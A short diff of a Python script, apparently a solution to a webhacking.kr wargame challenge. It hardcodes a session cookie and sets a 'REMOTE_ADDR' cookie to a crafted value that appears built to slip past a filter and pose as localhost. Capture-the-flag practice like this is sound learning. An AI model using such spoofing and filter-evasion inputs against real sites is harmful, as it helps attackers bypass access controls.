@@ -3,9 +3,7 @@ import urllib2
 import CookieManager
 
 challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-4/"
-sessionId = "e28ad7cb81a98a13982054373940bf92"
-
-CookieManager.addCookie("PHPSESSID", sessionId)
+CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
 CookieManager.addCookie("REMOTE_ADDR", "112277..00..00..1")
     
 httpRequest = urllib2.Request(challengeUrl)
